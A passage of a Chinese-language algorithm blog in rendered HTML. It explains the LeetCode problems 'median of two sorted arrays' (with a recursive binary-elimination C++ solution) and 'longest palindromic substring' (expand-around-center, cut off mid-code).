style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>，不满足题目要求</p><p><strong>优化</strong>：本质上我们需要找到两数组排序后第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=\frac{m+n}{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1473309999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.802331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span>小的数，我们可以从题目要求的时间复杂度入手<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(m+n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，尝试二分的思想。</p><p>（若A、B数组的元素个数均大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时）各取A、B数组中第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素，若A中所取元素小于B中所取元素，即A中元素取少了，B中元素取多了，则A中前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素必定在要取中位数前（换句话说中位数不可能出现在这些元素中），我们可以不再考虑这些元素。反之也成立，由此可将k的规模减少一半，在剩下的数据中寻找第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>−</mo><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">k-\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>小的元素，将其作为新的k值继续递归即可。</p><p>（若A、B数组的元素个数有一个小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时，不可能全部小于）那取小数组的最后一个元素与大数组的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素，若前者小于后者，则中位数不可能出在前一个数组中，即中位数为大数组的第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>−</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">k-m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>个数，若后者小于前者，则后数组前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素中不存在中位数。删去前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素即可。</p><p><strong>时间复杂度</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=\frac{m+n}{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1473309999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.802331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span>，每次递归k的规模减小一半，则时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(m+n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p><p><strong>注意</strong>：考虑数组越界问题，<code>find()</code>函数实现时确保前一个数组一定小于后一个数组，这样可以避免很多边界问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> total=nums1.<span class="built_in">size</span>()+nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(total%<span class="number">2</span>==<span class="number">0</span>)<span class="comment">//m+n为偶数，中位数为中间两数平均</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> left=<span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>);<span class="comment">//中位左数</span></span><br><span class="line">            <span class="type">int</span> right=<span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>+<span class="number">1</span>);<span class="comment">//中位右数</span></span><br><span class="line">            <span class="keyword">return</span> (left+right)/<span class="number">2.0</span>;<span class="comment">//注意细节，返回浮点数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自定义递归函数findknumber</span></span><br><span class="line"><span class="comment">//含义为寻找从下标i开始的nums1数组和从下标为j开始的nums2数组合并后第k大的数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findknumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> i, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> j,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//确保nums1长度小于nums2，便于判断边界</span></span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>()-i&gt;nums2.<span class="built_in">size</span>()-j) <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums2,j,nums1,i,k);</span><br><span class="line">        <span class="comment">//当短数组遍历完时(注意细节)</span></span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>()==i) <span class="keyword">return</span> nums2[j<span class="number">-1</span>+k];</span><br><span class="line">        <span class="comment">//当k为1时，正常情况的递归出口</span></span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">min</span>(nums1[i],nums2[j]);</span><br><span class="line">        <span class="comment">//正常递归情况</span></span><br><span class="line">        <span class="type">int</span> si=<span class="built_in">min</span>(i+k/<span class="number">2</span>,<span class="built_in">int</span>(nums1.<span class="built_in">size</span>())); <span class="comment">//考虑短数组长度小于k/2 </span></span><br><span class="line">        <span class="type">int</span> sj=j+k/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums1[si<span class="number">-1</span>]&gt;nums2[sj<span class="number">-1</span>])<span class="comment">//因si、sj保存的是第几个数，需-1</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,i,nums2,sj,k-(sj-j));<span class="comment">//舍弃nums2前半段</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,si,nums2,j,k-(si-i));<span class="comment">//舍弃nums1前半段</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>有一种利用二分非递归的做法，可将时间复杂度优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(min(m,n)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，但细节处较为繁琐，待我学学再做补充</p></blockquote><h2 id="5-最长回文子串"><a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h2><p>经典题目，做法很多，有<a href="https://zhuanlan.zhihu.com/p/80323989">Manacher算法</a>时间复杂度可优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，但该算法几乎只可解决此类问题，并不实用，字符串哈希搭配二分<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>（以后补充）</p><p>因为该题给出的数据量较小，此处我们选择一种便于理解的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的算法，此题用DP也可过但需要额外的空间复杂度</p><p><strong>基本思路</strong>：回文串指左右对称的字符串，大体分为奇数型和偶数型，遍历整个字符串，选取中间节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>，若为奇数型，从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[i-1,i+1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span> 向左右寻找，直到遇到不同字符或数组边界，若为偶数型，从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[i,i+1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span> 向左右寻找即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string res; <span class="comment">//储存回文子串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++) <span class="comment">//遍历中间点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//奇数回文串</span></span><br><span class="line">            <span class="type">int</span> l=i<span 